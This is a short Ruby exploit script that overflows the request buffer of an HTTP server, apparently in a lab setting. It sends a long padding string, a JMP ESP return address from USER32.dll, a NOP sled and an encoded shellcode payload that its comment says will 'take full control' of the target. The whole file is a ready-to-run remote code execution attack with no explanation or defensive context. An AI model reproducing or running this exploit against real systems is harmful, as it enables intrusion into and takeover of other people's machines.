require 'socket'

sock = TCPSocket.new("192.168.135.129", 80)

buffer = "GET "

# Get to EIP
buffer += "A"*1787

# Used USER32.dll to find this JMP ESP
buffer += "\x0a\xaf\xd8\x77"

# We need to add in some "blank" data, otherwise, the program will likely just crash
buffer += "\x90"*12

# Run our shellcode to take full control!!!!

buffer += "\xb8\x9a\x74\x22\xa0\xd9\xc7\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x47\x83\xc3\x04\x31\x43\x0f\x03\x43\x95\x96\xd7\x5c\x41\xd4\x18\x9d\x91\xb9\x91\x78\xa0\xf9\xc6\x09\x92\xc9\x8d\x5c\x1e\xa1\xc0\x74\x95\xc7\xcc\x7b\x1e\x6d\x2b\xb5\x9f\xde\x0f\xd4\x23\x1d\x5c\x36\x1a\xee\x91\x37\x5b\x13\x5b\x65\x34\x5f\xce\x9a\x31\x15\xd3\x11\x09\xbb\x53\xc5\xd9\xba\x72\x58\x52\xe5\x54\x5a\xb7\x9d\xdc\x44\xd4\x98\x97\xff\x2e\x56\x26\xd6\x7f\x97\x85\x17\xb0\x6a\xd7\x50\x76\x95\xa2\xa8\x85\x28\xb5\x6e\xf4\xf6\x30\x75\x5e\x7c\xe2\x51\x5f\x51\x75\x11\x53\x1e\xf1\x7d\x77\xa1\xd6\xf5\x83\x2a\xd9\xd9\x02\x68\xfe\xfd\x4f\x2a\x9f\xa4\x35\x9d\xa0\xb7\x96\x42\x05\xb3\x3a\x96\x34\x9e\x52\x5b\x75\x21\xa2\xf3\x0e\x52\x90\x5c\xa5\xfc\x98\x15\x63\xfa\xdf\x0f\xd3\x94\x1e\xb0\x24\xbc\xe4\xe4\x74\xd6\xcd\x84\x1e\x26\xf2\x50\xb0\x76\x5c\x0b\x71\x27\x1c\xfb\x19\x2d\x93\x24\x39\x4e\x7e\x4d\xd0\xb4\xe8\xb2\x8d\x30\xe9\x5a\xcc\x3e\xf8\xc6\x59\xd8\x90\xe6\x0f\x72\x0c\x9e\x15\x08\xad\x5f\x80\x74\xed\xd4\x27\x88\xa3\x1c\x4d\x9a\x53\xed\x18\xc0\xf5\xf2\xb6\x6f\xf9\x66\x3d\x26\xae\x1e\x3f\x1f\x98\x80\xc0\x4a\x93\x09\x55\x35\xcb\x75\xb9\xb5\x0b\x20\xd3\xb5\x63\x94\x87\xe5\x96\xdb\x1d\x9a\x0b\x4e\x9e\xcb\xf8\xd9\xf6\xf1\x27\x2d\x59\x09\x02\xaf\xa5\xdc\x6a\xc5\xc7\xdc"

buffer += " HTTP/1.1\r\n\r\n"

sock.write(buffer)

sock.close()
